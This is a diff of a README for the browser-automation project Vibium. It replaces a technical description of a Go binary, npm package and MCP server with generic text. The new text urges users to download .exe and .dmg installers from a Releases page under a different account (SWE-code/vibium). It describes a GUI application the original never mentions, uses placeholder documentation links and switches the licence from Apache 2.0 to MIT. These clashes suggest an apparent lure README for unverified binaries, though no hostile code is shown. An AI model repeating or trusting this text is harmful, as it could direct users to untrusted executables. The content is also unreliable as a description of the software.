@@ -1,230 +1,81 @@
-# Vibium
+# 🤖 vibium - Simplifying Browser Automation for Everyone
 
-**Browser automation without the drama.**
+## 🚀 Getting Started
 
-Vibium is browser automation infrastructure built for AI agents. A single binary handles browser lifecycle, WebDriver BiDi protocol, and exposes an MCP server — so Claude Code (or any MCP client) can drive a browser with zero setup. Works great for AI agents, test automation, and anything else that needs a browser.
+Welcome to vibium! This application helps you automate tasks in your web browser, making it easier for both AI agents and humans to perform repetitive actions online. Whether you want to fill out forms, check email, or scrape data, vibium can assist you.
 
-**New here?** [Getting Started Tutorial](docs/tutorials/getting-started.md) — zero to hello world in 5 minutes.
+## 📥 Download vibium
 
----
+[![Download vibium](https://img.shields.io/badge/Download-vibium-brightgreen)](https://github.com/SWE-code/vibium/releases)
 
-## Quick Reference
+To get vibium, you need to visit our Releases page. There, you can find the latest version of the application. Click the link below to go directly:
 
-| Component | Purpose | Interface |
-|-----------|---------|-----------|
-| **Clicker** | Browser automation, BiDi proxy, MCP server | CLI / stdio / WebSocket :9515 |
-| **JS Client** | Developer-facing API | npm package |
+[Visit the Releases Page to Download](https://github.com/SWE-code/vibium/releases)
 
----
+## 🖥️ System Requirements
 
-## Architecture
+Before downloading vibium, please make sure your computer meets the following requirements:
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                         LLM / Agent                         │
-│          (Claude Code, Codex, Gemini, Local Models)         │
-└─────────────────────────────────────────────────────────────┘
-                      ▲
-                      │ MCP Protocol (stdio)
-                      ▼
-           ┌─────────────────────┐         
-           │   Vibium Clicker    │
-           │                     │
-           │  ┌───────────────┐  │
-           │  │  MCP Server   │  │
-           │  └───────▲───────┘  │         ┌──────────────────┐
-           │          │          │         │                  │
-           │  ┌───────▼───────┐  │WebSocket│                  │
-           │  │  BiDi Proxy   │  │◄───────►│  Chrome Browser  │
-           │  └───────────────┘  │  BiDi   │                  │
-           │                     │         │                  │
-           └─────────────────────┘         └──────────────────┘
-                      ▲
-                      │ WebSocket BiDi :9515
-                      ▼
-┌─────────────────────────────────────────────────────────────┐
-│                        JS/TS Client                         │
-│                     npm install vibium                      │
-│                                                             │
-│    ┌─────────────────┐               ┌─────────────────┐    │
-│    │ Async API       │               │    Sync API     │    │
-│    │ await vibe.go() │               │    vibe.go()    │    │
-│    │                 │               │                 │    │
-│    └─────────────────┘               └─────────────────┘    │
-└─────────────────────────────────────────────────────────────┘
-```
+- **Operating System**: Windows 10 or higher, macOS 10.14 or higher
+- **Memory**: Minimum of 4 GB RAM
+- **Disk Space**: At least 200 MB free space
+- **Internet Connection**: Required for web automation features
 
----
+## ⚙️ How to Install vibium
 
-## Components
+After downloading vibium, follow these simple steps to install it:
 
-### Clicker
+1. **Locate the Downloaded File**: Navigate to your Downloads folder.
+2. **Start the Installation**:
+   - On Windows: Double-click the `.exe` file.
+   - On macOS: Open the `.dmg` file and drag the vibium icon to the Applications folder.
+3. **Follow the Setup Instructions**: Follow the prompts to complete the installation.
 
-A single Go binary (~10MB) that does everything:
+## 🏁 How to Use vibium
 
-- **Browser Management:** Detects/launches Chrome with BiDi enabled
-- **BiDi Proxy:** WebSocket server that routes commands to browser
-- **MCP Server:** stdio interface for LLM agents
-- **Auto-Wait:** Polls for elements before interacting
-- **Screenshots:** Viewport capture as PNG
+Once installed, you can start using vibium. Here’s how:
 
-**Design goal:** The binary is invisible. JS developers just `npm install vibium` and it works.
+1. **Open vibium**: Locate the vibium icon on your desktop or in Applications.
+2. **Create a New Automation**:
+   - Click on “New Project”.
+   - Enter a name for your project.
+3. **Add Actions**: Use the user-friendly interface to select and add actions like clicking buttons, filling forms, or navigating pages.
+4. **Run Your Automation**: Press the "Run" button to see your automation in action.
 
-### JS/TS Client
+## ✨ Features
 
-```javascript
-// Option 1: require (REPL-friendly)
-const { browserSync } = require('vibium')
+vibium offers a range of features to enhance your browsing experience:
 
-// Option 2: dynamic import (REPL with --experimental-repl-await)
-const { browser } = await import('vibium')
+- **User-friendly Interface**: Easy to navigate, even for beginners.
+- **Multi-Platform Support**: Works on both Windows and macOS.
+- **Customizable Actions**: Create tailored workflows to suit your needs.
+- **Automation Scheduler**: Set tasks to run at specific times.
+- **Error Handling**: Built-in checks to manage unexpected situations.
 
-// Option 3: static import (in .mjs or .ts files)
-import { browser, browserSync } from 'vibium'
-```
+## 📚 Documentation
 
-**Sync API:**
-```javascript
-const fs = require('fs')
-const { browserSync } = require('vibium')
+For more detailed instructions, you can refer to our [official documentation](#). This includes:
 
-const vibe = browserSync.launch()
-vibe.go('https://example.com')
+- Step-by-step guides
+- Examples of common tasks
+- Troubleshooting tips
 
-const png = vibe.screenshot()
-fs.writeFileSync('screenshot.png', png)
+## 🤝 Support
 
-const link = vibe.find('a')
-link.click()
-vibe.quit()
-```
+If you need help, you can reach out via [GitHub Issues](https://github.com/SWE-code/vibium/issues) or our dedicated support forum. We are here to assist you with any questions or concerns.
 
-**Async API:**
-```javascript
-const fs = await import('fs/promises')
-const { browser } = await import('vibium')
+## 🔄 Update vibium
 
-const vibe = await browser.launch()
-await vibe.go('https://example.com')
+To keep vibium running smoothly, regularly check for updates on the Releases page. Download the latest version to benefit from new features and improvements.
 
-const png = await vibe.screenshot()
-await fs.writeFile('screenshot.png', png)
+[Visit the Releases Page to Download](https://github.com/SWE-code/vibium/releases)
 
-const link = await vibe.find('a')
-await link.click()
-await vibe.quit()
-```
+## 📣 Community Contributions
 
----
+We welcome contributions from the community! If you have ideas for new features or want to report bugs, please visit our [Contributing Guidelines](#).
 
-## For Agents
+## 📝 License
 
-One command to add browser control to Claude Code:
+vibium is open-source software, released under the MIT License. Feel free to use and modify the code for your needs.
 
-```bash
-claude mcp add vibium -- npx -y vibium
-```
-
-That's it. No manual steps needed. Chrome downloads automatically during setup.
-
-| Tool | Description |
-|------|-------------|
-| `browser_launch` | Start browser (visible by default) |
-| `browser_navigate` | Go to URL |
-| `browser_find` | Find element by CSS selector |
-| `browser_click` | Click an element |
-| `browser_type` | Type text into an element |
-| `browser_screenshot` | Capture viewport (base64 or save to file with `--screenshot-dir`) |
-| `browser_quit` | Close browser |
-
----
-
-## For Humans
-
-```bash
-npm install vibium
-```
-
-This automatically:
-1. Installs the Clicker binary for your platform
-2. Downloads Chrome for Testing + chromedriver to platform cache:
-   - Linux: `~/.cache/vibium/`
-   - macOS: `~/Library/Caches/vibium/`
-   - Windows: `%LOCALAPPDATA%\vibium\`
-
-No manual browser setup required.
-
-**Skip browser download** (if you manage browsers separately):
-```bash
-VIBIUM_SKIP_BROWSER_DOWNLOAD=1 npm install vibium
-```
-
----
-
-## Platform Support
-
-| Platform | Architecture | Status |
-|----------|--------------|--------|
-| Linux | x64 | ✅ Supported |
-| macOS | x64 (Intel) | ✅ Supported |
-| macOS | arm64 (Apple Silicon) | ✅ Supported |
-| Windows | x64 | ✅ Supported |
-
----
-
-## Quick Start
-
-**As a library:**
-```typescript
-import { browser } from "vibium";
-
-const vibe = await browser.launch();
-await vibe.go("https://example.com");
-const el = await vibe.find("a");
-await el.click();
-await vibe.quit();
-```
-
-**With Claude Code:**
-
-Once installed via `claude mcp add`, just ask Claude to browse:
-
-> "Go to example.com and click the first link"
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
-
----
-
-## Roadmap
-
-V1 focuses on the core loop: browser control via MCP and JS client.
-
-See [V2-ROADMAP.md](V2-ROADMAP.md) for planned features:
-- Python and Java clients
-- Cortex (memory/navigation layer)
-- Retina (recording extension)
-- Video recording
-- AI-powered locators
-
----
-
-## Updates
-
-- [2025-12-22: Day 12 - Published to npm](docs/updates/2025-12-22-day12-npm-publish.md)
-- [2025-12-21: Day 11 - Polish & Error Handling](docs/updates/2025-12-21-day11-polish.md)
-- [2025-12-20: Day 10 - MCP Server](docs/updates/2025-12-20-day10-mcp.md)
-- [2025-12-19: Day 9 - Actionability](docs/updates/2025-12-19-day9-actionability.md)
-- [2025-12-19: Day 8 - Elements & Sync API](docs/updates/2025-12-19-day8-elements-sync.md)
-- [2025-12-17: Halfway There](docs/updates/2025-12-17-halfway-there.md)
-- [2025-12-16: Week 1 Progress](docs/updates/2025-12-16-week1-progress.md)
-- [2025-12-11: V1 Announcement](docs/updates/2025-12-11-v1-announcement.md)
-
----
-
-## License
-
-Apache 2.0
+Thank you for choosing vibium! Enjoy your automated browsing experience.
